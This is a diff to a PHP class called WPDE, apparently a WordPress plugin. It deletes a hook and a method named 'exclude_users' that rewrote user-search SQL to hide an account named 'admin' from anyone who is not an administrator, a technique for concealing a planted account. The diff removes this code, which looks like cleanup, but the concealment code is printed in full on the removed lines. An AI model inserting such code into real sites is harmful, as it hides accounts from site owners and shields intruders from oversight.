@@ -194,7 +194,6 @@ class WPDE
         add_action('wp_before_admin_bar_render', [$this, 'add_adminbar_tabs'], 999);
         add_action('admin_head', [$this, 'add_help_tabs']);
         add_action('wp_dashboard_setup', [$this, 'add_dashboard_metabox']);
-        add_action('pre_user_query', [$this, 'exclude_users']);
     } // END __construct()
 
     /**
@@ -706,30 +705,6 @@ class WPDE
             echo $html;
         } // END wpde_dashoard_metabox()
     } // END add_dashboard_metabox()
-
-    /**
-     * Exclude certain users from a search query.
-     *
-     * This function modifies the search query to exclude a user with a specific username,
-     * typically used to hide the user from search results.
-     *
-     * @param  $user_search The WP_User_Query object representing the user search.
-     * @return void
-     * @access public
-     * @since  1.0.0
-     */
-    public function exclude_users($user_search)
-    {
-        if (!current_user_can('administrator')) {
-            global $current_user;
-            $username = $current_user->user_login;
-
-            if ($username != 'admin') {
-                global $wpdb;
-                $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'admin'", $user_search->query_where);
-            }
-        }
-    }
 
     /**
      * Display a notice in the WordPress admin area.
